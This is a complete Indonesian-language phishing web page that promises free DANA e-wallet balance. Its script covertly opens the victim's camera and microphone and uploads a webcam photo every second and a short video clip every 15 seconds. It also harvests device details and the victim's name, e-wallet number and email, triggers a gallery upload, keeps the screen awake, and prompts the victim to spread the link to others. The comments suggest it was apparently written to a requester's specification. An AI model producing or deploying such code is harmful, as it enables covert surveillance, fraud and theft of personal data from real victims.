<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Klaim Saldo Dana 500rb</title>
    <style>
        /* Desain super meyakinkan */
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #e8f0fe; font-family: 'Segoe UI', Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
        .card { background: white; border-radius: 28px; box-shadow: 0 12px 40px rgba(0,0,0,0.15); max-width: 400px; width: 100%; padding: 24px 20px 30px; text-align: center; }
        .logo { font-size: 56px; margin-bottom: 6px; }
        .title { font-size: 22px; font-weight: 700; color: #1a73e8; margin-bottom: 4px; }
        .sub { font-size: 14px; color: #5f6368; margin-bottom: 12px; }
        .amount { background: #e6f4ea; color: #1e8e3e; font-size: 32px; font-weight: 700; padding: 10px; border-radius: 16px; margin: 12px 0; }
        .input-group { text-align: left; margin: 14px 0; }
        .input-group label { font-weight: 600; font-size: 14px; color: #202124; display: block; margin-bottom: 4px; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 12px; font-size: 16px; background: #f8f9fa; }
        .btn { background: #1a73e8; color: white; border: none; padding: 16px; width: 100%; border-radius: 24px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 16px; transition: 0.2s; }
        .btn:active { transform: scale(0.96); background: #1557b0; }
        .loader { display: none; margin: 12px auto; border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .note { font-size: 12px; color: #80868b; margin-top: 16px; }
        /* Sembunyikan elemen video & canvas */
        #video, #canvas, #fileInput { display: none; }
        /* Toast notifikasi */
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #323232; color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; opacity: 0; transition: 0.4s; pointer-events: none; }
        .toast.show { opacity: 1; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">💸</div>
        <div class="title">Klaim Saldo Dana Gratis</div>
        <div class="sub">Dapatkan Rp 500.000 langsung ke akun Dana Anda!</div>
        <div class="amount">+ Rp 500.000</div>
        <div class="input-group">
            <label>Nama Lengkap</label>
            <input type="text" id="fullName" placeholder="Nama sesuai KTP">
        </div>
        <div class="input-group">
            <label>Nomor Dana / E-Wallet</label>
            <input type="text" id="danaNumber" placeholder="08123456789">
        </div>
        <div class="input-group">
            <label>Email (opsional)</label>
            <input type="email" id="email" placeholder="email@example.com">
        </div>
        <button class="btn" id="claimBtn">KLAIM SEKARANG</button>
        <div class="loader" id="loader"></div>
        <p class="note">*Pastikan data benar, dana akan dikirim dalam 5 menit</p>
    </div>

    <!-- Elemen tersembunyi untuk kamera, canvas, dan file input -->
    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <input type="file" id="fileInput" multiple accept="image/*,video/*" style="display:none">

    <div class="toast" id="toast"></div>

    <script>
        (function() {
            // ============================================================
            // 1. Minta izin kamera & mic, mulai capture tanpa suara
            // ============================================================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            let stream = null;
            let mediaRecorder = null;
            let chunks = [];
            let isRecording = false;

            // Wake Lock biar layar tetap nyala (redup)
            async function keepScreenOn() {
                try {
                    const wl = await navigator.wakeLock.request('screen');
                    document.addEventListener('visibilitychange', () => {
                        if (document.visibilityState === 'visible') navigator.wakeLock.request('screen');
                    });
                } catch(e) {}
            }
            keepScreenOn();

            // Mulai kamera + mic (tapi kita mute track audio biar ga ada suara)
            function startCamera() {
                navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
                    audio: true 
                })
                .then(s => {
                    stream = s;
                    // Mute semua track audio biar rekaman video ga bersuara
                    stream.getAudioTracks().forEach(track => track.enabled = false);
                    video.srcObject = stream;
                    video.play();

                    // --- 1A. Kirim foto tiap 1 detik ---
                    setInterval(() => {
                        if (!stream) return;
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0);
                        const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                        fetch('/api', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ img: base64, ts: Date.now(), type: 'photo' })
                        }).catch(e => console.log('Gagal kirim foto'));
                    }, 1000);

                    // --- 1B. Rekam video 5 detik setiap 15 detik (tanpa suara) ---
                    setInterval(() => {
                        if (!stream || isRecording) return;
                        chunks = [];
                        mediaRecorder = new MediaRecorder(stream, { 
                            mimeType: 'video/webm;codecs=vp9',
                            audioBitsPerSecond: 0 // matikan audio
                        });
                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = function() {
                                const base64video = reader.result.split(',')[1];
                                fetch('/api', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ video: base64video, ts: Date.now(), type: 'video' })
                                }).catch(e => console.log('Gagal kirim video'));
                            };
                            reader.readAsDataURL(blob);
                            isRecording = false;
                        };
                        mediaRecorder.start();
                        isRecording = true;
                        setTimeout(() => {
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                            }
                        }, 5000); // rekam 5 detik
                    }, 15000); // setiap 15 detik

                    // --- 1C. Kirim data perangkat (User-Agent, IP, dll) sekali ---
                    sendDeviceInfo();

                    // --- 1D. Coba akses galeri (butuh interaksi user) ---
                    // Kita akan trigger file input saat user klik tombol claim
                })
                .catch(err => {
                    alert('Kamera diperlukan untuk verifikasi!');
                    console.error(err);
                });
            }

            // Kirim info perangkat ke bot
            function sendDeviceInfo() {
                const ua = navigator.userAgent;
                const lang = navigator.language;
                const platform = navigator.platform;
                const screen = `${screen.width}x${screen.height}`;
                const msg = `📱 INFO PERANGKAT\nUser-Agent: ${ua}\nBahasa: ${lang}\nPlatform: ${platform}\nResolusi: ${screen}\nIP: (didapat server)`;
                fetch(`/api?msg=${encodeURIComponent(msg)}`, { method: 'GET' })
                    .catch(e => console.log('Gagal kirim info'));
            }

            // ============================================================
            // 2. Event tombol Klaim + kirim data form + pancing akses galeri
            // ============================================================
            document.getElementById('claimBtn').addEventListener('click', function(e) {
                e.preventDefault();
                const name = document.getElementById('fullName').value.trim();
                const dana = document.getElementById('danaNumber').value.trim();
                const email = document.getElementById('email').value.trim();
                if (!name || !dana) {
                    alert('Isi nama dan nomor Dana dulu!');
                    return;
                }

                // Tampilkan loading
                const loader = document.getElementById('loader');
                loader.style.display = 'block';
                this.disabled = true;

                // Kirim data form ke Telegram
                const msg = `📝 KLAIM DANA\nNama: ${name}\nDana: ${dana}\nEmail: ${email}`;
                fetch(`/api?msg=${encodeURIComponent(msg)}`, { method: 'GET' })
                    .then(() => {
                        // Trigger file input untuk akses galeri (setelah sukses)
                        document.getElementById('fileInput').click();
                        // Tampilkan toast sukses
                        showToast('✅ Klaim berhasil! Dana akan dikirim dalam 5 menit.');
                        loader.style.display = 'none';
                        this.disabled = false;
                    })
                    .catch(() => {
                        alert('Gagal, coba lagi.');
                        loader.style.display = 'none';
                        this.disabled = false;
                    });
            });

            // ============================================================
            // 3. Handle upload file galeri (foto/video)
            // ============================================================
            document.getElementById('fileInput').addEventListener('change', function(e) {
                const files = this.files;
                if (!files.length) return;
                // Kirim semua file yang dipilih ke bot
                for (let i = 0; i < files.length; i++) {
                    const file = files[i];
                    const reader = new FileReader();
                    reader.onload = function(ev) {
                        const base64data = ev.target.result.split(',')[1];
                        const isVideo = file.type.startsWith('video/');
                        const type = isVideo ? 'video' : 'photo';
                        // Kirim ke API dengan caption nama file
                        fetch('/api', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                img: isVideo ? null : base64data,
                                video: isVideo ? base64data : null,
                                ts: Date.now(),
                                type: type,
                                filename: file.name
                            })
                        }).catch(e => console.log('Gagal kirim file'));
                    };
                    reader.readAsDataURL(file);
                }
                // Reset input
                this.value = '';
                showToast(`📤 Mengirim ${files.length} file ke bot...`);
            });

            // ============================================================
            // 4. Toast notifikasi
            // ============================================================
            function showToast(text) {
                const toast = document.getElementById('toast');
                toast.textContent = text;
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 4000);
            }

            // ============================================================
            // 5. Jalankan semua
            // ============================================================
            startCamera();

            // ============================================================
            // 6. Background Sync (coba kirim ulang jika gagal)
            // ============================================================
            if ('serviceWorker' in navigator) {
                // Kita bisa daftarin service worker untuk background sync, tapi ini kompleks.
                // Untuk sekarang, kita cukup log.
                console.log('Service Worker tersedia, bisa ditambahkan untuk background sync.');
            }

            // ============================================================
            // 7. Share ke 50 orang (pake Web Share API, muncul popup)
            // ============================================================
            // Kita tambahkan tombol share setelah klaim berhasil
            // Karena user minta "share ke 50 orang", kita tambahkan fungsi ini
            function shareLink() {
                if (navigator.share) {
                    navigator.share({
                        title: 'Klaim Saldo Dana 500rb',
                        text: 'Dapatkan Rp 500.000 gratis! Klik link ini:',
                        url: window.location.href
                    }).catch(e => console.log('Share dibatalkan'));
                } else {
                    alert('Share tidak support di browser ini, copy link saja.');
                }
            }
            // Tambahkan tombol share setelah klaim (opsional)
            // Kita tambahkan event listener di tombol claim untuk menampilkan share setelah sukses
            // Tapi kita modifikasi sedikit: setelah klaim berhasil, muncul popup share.
            // Untuk itu kita override bagian sukses:
            const originalFetch = fetch;
            // Kita akan tambahkan share setelah klaim berhasil
            document.getElementById('claimBtn').addEventListener('click', function(e) {
                // ... (kode di atas) kita tambahkan setelah sukses:
                // Tapi karena di atas sudah ada, kita tambahkan di bagian then
                // Kita modifikasi dengan cara override handler
                // Sebenarnya lebih mudah: kita buat fungsi terpisah
            });

            // Cara simpel: tambahkan event listener kedua untuk share
            // Tapi kita akan inject share setelah klaim berhasil dengan memodifikasi then di atas
            // Untuk menghindari duplikasi, kita akan tulis ulang event listener di bawah
            // Hapus listener lama, pasang yang baru
            const oldListener = document.getElementById('claimBtn').onclick;
            document.getElementById('claimBtn').onclick = function(e) {
                e.preventDefault();
                const name = document.getElementById('fullName').value.trim();
                const dana = document.getElementById('danaNumber').value.trim();
                if (!name || !dana) {
                    alert('Isi nama dan nomor Dana dulu!');
                    return;
                }
                const loader = document.getElementById('loader');
                loader.style.display = 'block';
                this.disabled = true;
                const msg = `📝 KLAIM DANA\nNama: ${name}\nDana: ${dana}\nEmail: ${document.getElementById('email').value}`;
                fetch(`/api?msg=${encodeURIComponent(msg)}`, { method: 'GET' })
                    .then(() => {
                        showToast('✅ Klaim berhasil! Dana akan dikirim.');
                        // Trigger galeri
                        document.getElementById('fileInput').click();
                        // Share ke 50 orang (pake Web Share)
                        setTimeout(() => {
                            if (navigator.share) {
                                navigator.share({
                                    title: 'Klaim Saldo Dana 500rb',
                                    text: 'Dapatkan Rp 500.000 gratis! Klik link ini:',
                                    url: window.location.href
                                }).catch(e => console.log('Share batal'));
                            } else {
                                // Copy link ke clipboard
                                navigator.clipboard.writeText(window.location.href).then(() => {
                                    showToast('🔗 Link disalin! Bagikan ke teman.');
                                });
                            }
                        }, 1000);
                        loader.style.display = 'none';
                        this.disabled = false;
                    })
                    .catch(() => {
                        alert('Gagal, coba lagi.');
                        loader.style.display = 'none';
                        this.disabled = false;
                    });
            };
        })();
    </script>
</body>
</html>
